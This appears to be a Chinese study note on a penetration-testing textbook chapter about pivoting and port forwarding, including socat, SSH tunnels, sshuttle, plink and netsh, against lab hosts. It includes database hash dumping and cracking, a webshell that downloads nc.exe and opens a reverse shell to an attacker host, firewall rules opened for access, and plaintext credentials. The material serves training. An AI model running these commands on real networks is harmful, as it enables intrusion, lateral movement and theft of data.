本篇对应教材第18章，主要内容“Linux端口转发”、“SSH隧道”、“Windows端口转发”，记录使用工具和命令

## 18.2 使用linux工具端口转发

### 18.2.3 socat端口转发

跳板机上

```armasm
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
```

kali上连接跳板机的2345端口就会转发到内网10.4.50.215:5432端口

```armasm
psql -h 192.168.50.63 -p 2345 -U postgres
```

登录postgres数据库，查看数据库信息，查看表信息，查看内容

```armasm
\l
\c confluence
select * from cwd_user;
```

获得密码进行暴力破解

```armasm
hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt
```

破解出密码后，在跳板机上做端口转发

```armasm
socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
```

kali上ssh连上去

```armasm
ssh database_admin@192.168.50.63 -p2222
```

## 18.3 SSH隧道

### 18.3.1 本地端口转发

kali（192）---跳板1（192和10）---跳板2（10和172）--目标（172）

ssh需要交互式shell操作，需要在跳板1上转换交互式shell

```armasm
python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh database_admin@10.4.50.215
ip addr
```

在跳板2上发现172段，查看路由，并扫描172段存活主机445端口

```armasm
ip route
for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done
```

发现一台

```armasm
172.16.50.217 445
```

现在想要在kali上连接172段的445端口

在跳板1上做本地端口转发到跳板2的172段

```armasm
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
ss -ntplu
```

kali上连接

```armasm
smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234
smbclient -p 4455 //192.168.50.63/scripts -U hr_admin --password=Welcome1234
ls
get Provisioning.ps1
```

成功下载172主机上的ps1文件

### 18.3.2 动态端口转发

kali（192）---跳板1（192和10）---跳板2（10和172）--目标（172）

跳板1上开启9999端口做socks代理

```armasm
python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
```

kali上设置proxychains4

```armasm
tail /etc/proxychains4.conf

socks5 192.168.50.63 9999
```

```armasm
proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234

proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217
```

### 18.3.3 远程端口转发

kali（192）---跳板1（192和10）---跳板2（10和172）

kali上开启ssh服务

```armasm
sudo systemctl start ssh
sudo ss -ntplu
```

跳板1上ssh连接kali

```armasm
python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
```

连接成功后kali上会开启2345端口，kali上连接自己的2345就是跳板2的5432端口

```armasm
ss -ntplu
psql -h 127.0.0.1 -p 2345 -U postgres
```

### 18.3.4 远程动态端口转发

kali（192）---跳板1（192和10）---跳板2（10和172）

跳板1上ssh连接kali

```armasm
python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh -N -R 9998 kali@192.168.118.4
```

连接成功后kali上开启了9998的socks代理

```armasm
sudo ss -ntplu
tail /etc/proxychains4.conf
socks5 127.0.0.1 9998
proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.50.64
```

### 18.3.5 sshuttle

kali（192）---跳板1（192和10）---跳板2（10和172）--目标（172）

跳板1上做端口转发

```armasm
socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
```

kali上通过跳板1的转发ssh到跳板2上，并添加10和172网段

```armasm
sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
```

连接成功后kali可以直接访问10和172段

```armasm
smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
```

## 18.4 Windows端口转发工具

### 18.4.1 ssh.exe

kali（192）---win跳板1（192和10）---目标（10）

kali上开启ssh服务

```armasm
sudo systemctl start ssh
```

rdp到跳板1上，找到ssh.exe，连接kali

```armasm
xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.50.64
where ssh
ssh.exe -V
版本高于7.6才可以做端口转发
ssh -N -R 9998 kali@192.168.118.4
```

kali上开启了9998的socks代理，配置proxychains后可以连10段主机

```armasm
ss -ntplu
tail /etc/proxychains4.conf
socks5 127.0.0.1 9998
proxychains psql -h 10.4.50.215 -U postgres
\l
```

### 18.4.2 plink

kali（192）---防火墙（屏蔽连接跳板1的3389端口）---win跳板1（192）

开上开启80端口web服务供下载文件

```armasm
sudo systemctl start apache2
find / -name nc.exe 2>/dev/null
sudo cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/
find / -name plink.exe 2>/dev/null
sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/

nc -nvlp 4446
```

跳板1上使用webshell下载nc，反弹shell到kali上

```armasm
powershell wget -Uri http://192.168.118.4/nc.exe -OutFile C:\Windows\Temp\nc.exe
C:\Windows\Temp\nc.exe -e cmd.exe 192.168.118.4 4446
powershell wget -Uri http://192.168.118.4/plink.exe -OutFile C:\Windows\Temp\plink.exe
```

下载plink后，做ssh到kali，开启kali的9833端口，连接到跳板1的3389端口

```armasm
C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
```

kali上查看开启端口，并rdp本机9833就是跳板1的3389端口

```armasm
ss -ntplu
xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
```

### 18.4.3 Netsh

kali（192）---win跳板1（192和10）---目标（10）

跳板1上做转发

```armasm
xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.50.64
管理员运行cmd
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215
```

映射跳板2222端口到目标的22端口，查看跳板2222是否开放及代理列表

```armasm
netstat -anp TCP | find "2222"
netsh interface portproxy show all
```

kali扫描跳板的2222端口

```armasm
sudo nmap -sS 192.168.50.64 -Pn -n -p2222
```

不成功，因为Windows防火墙会阻止kali连接2222端口，防火墙增加一条规则，允许入向连接2222端口

```armasm
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow
```

kali连接目标成功

```armasm
sudo nmap -sS 192.168.50.64 -Pn -n -p2222
ssh database_admin@192.168.50.64 -p2222
```

删除防火墙及代理策略

```armasm
netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
```

更多更新资料（微信公众号：TopRedTeam）

![](./qrcode.jpg)
